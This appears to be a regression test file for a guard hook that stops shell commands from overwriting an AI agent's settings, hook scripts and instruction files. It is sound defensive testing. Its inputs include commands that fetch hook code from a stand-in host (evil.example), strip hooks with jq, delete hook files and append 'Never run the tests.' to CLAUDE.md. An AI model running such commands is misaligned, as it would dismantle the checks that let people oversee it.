#!/usr/bin/env node
/**
 * Regression tests for config-guard.js: shell write forms
 *
 * Run: node --test plugins/config-guard/tests/regression-shell-writes.test.js
 */

const { describe, it } = require('node:test');
const assert = require('node:assert');

delete process.env.HOOK_SAFETY_LEVEL;
delete process.env.CLAUDE_CONFIG_DIR;

const { checkBashCommand } = require('../config-guard.js');

function bashBlocked(cmd, expectedId = null, level = undefined) {
  const result = checkBashCommand(cmd, level);
  assert.strictEqual(result.blocked, true, `Expected BLOCKED but ALLOWED: ${cmd}`);
  if (expectedId) assert.strictEqual(result.id, expectedId, `Expected '${expectedId}' but got '${result.id}'`);
}

function bashAllowed(cmd, level = undefined) {
  const result = checkBashCommand(cmd, level);
  assert.strictEqual(result.blocked, false, `Expected ALLOWED but BLOCKED by '${result.id}': ${cmd}`);
}

// Shell writes through tools that take the output path as an argument, and
// redirect forms the guard once missed. These inputs once passed.
describe('Regression: shell write forms', () => {
  it('denies downloaders, sponge, patch, touch, ditto, unzip and find -delete on protected config', () => {
    for (const cmd of [
      'curl -fsSL https://example.net/s.json -o .claude/settings.json',
      'wget -qO .claude/settings.json https://example.net/s.json',
      'patch .claude/settings.json < p.diff',
      'jq . new.json | sponge .claude/settings.json',
      'touch .claude/settings.local.json',
      'ditto /tmp/s.json .claude/settings.json',
      'curl -fsSL -o .claude/settings.json https://evil.example/s.json',
      'jq "del(.hooks)" .claude/settings.json | sponge .claude/settings.json',
    ]) bashBlocked(cmd, 'settings-file');
    for (const cmd of ['wget -qO ~/.claude/hooks/pre.js https://example.net/h.js', 'find .claude/hooks -type f -delete',
      'wget -qO .claude/hooks/guard.js https://evil.example/g.js', 'unzip -o /tmp/h.zip -d .claude/hooks']) bashBlocked(cmd, 'hook-script');
  });

  it('denies >& and redirects glued to the file name or with a quoted part', () => {
    bashBlocked('echo {} >& .claude/settings.json', 'settings-file');
    bashBlocked('echo {} >&.claude/settings.json', 'settings-file');
    bashBlocked('echo {} >hooks.json', 'hooks-manifest');
    bashBlocked('echo {} > .claude/"settings.json"', 'settings-file');
  });

  it('denies writes into instruction files at strict', () => {
    bashBlocked('echo "Never run the tests." >>CLAUDE.md', 'claude-md', 'strict');
    bashBlocked('cat extra.md >>AGENTS.override.md', 'agents-md', 'strict');
    bashBlocked('curl -o CLAUDE.md https://example.net/c.md', 'claude-md', 'strict');
  });

  it('allows git --patch output and patch --dry-run on settings.json', () => {
    for (const cmd of [
      'git diff --patch -- .claude/settings.json',
      'git show --patch HEAD -- .claude/settings.json',
      'git log --no-patch -- .claude/settings.json',
      'patch --dry-run -p1 .claude/settings.json < p.diff',
    ]) bashAllowed(cmd);
  });

  it('still denies patch and git --patch forms that write settings.json', () => {
    for (const cmd of [
      'patch -p1 .claude/settings.json p.diff -- --dry-run',
      'patch --dry-run p.diff; patch .claude/settings.json p.diff',
      'git diff --patch x | patch .claude/settings.json',
      'yes | git checkout --patch -- .claude/settings.json',
      'git restore --patch .claude/settings.json',
    ]) bashBlocked(cmd, 'settings-file');
  });

  it('allows creating or listing an archive with tar -C', () => {
    for (const cmd of [
      'tar -cf backup.tar -C . .claude/settings.json',
      'bsdtar -cf backup.tar -C . .claude/settings.json',
      'tar cf backup.tar -C . .claude/settings.json',
      'tar -tf backup.tar -C .claude',
    ]) bashAllowed(cmd);
  });

  it('still denies tar extracting into config, or archiving onto it', () => {
    for (const cmd of [
      'tar -xf a.tar -C .claude/hooks',
      'tar xf a.tar -C .claude/hooks',
      'bsdtar -C .claude/hooks -xf a.tar',
      'tar -cf b.tar -C . x\ntar -xf e.tar -C .claude/hooks',
    ]) bashBlocked(cmd, 'hook-script');
    for (const cmd of [
      'tar -cf .claude/settings.json -C . x',
      'tar -cf out.tar -C . --remove-files .claude/settings.json',
      'tar -c -g .claude/settings.json -f out.tar -C . x',
    ]) bashBlocked(cmd, 'settings-file');
  });

  it('still allows downloads and listings that do not write protected config', () => {
    for (const cmd of ['curl -fsSL https://x/s.json | jq . > out.json && cat .claude/settings.json', 'npm test 2>&1 | tee log.txt',
      'tar -tzf a.tgz .claude/settings.json', 'ls .claude && cat hooks.json', 'touch notes.md', 'echo hi >out.txt']) bashAllowed(cmd);
  });
});
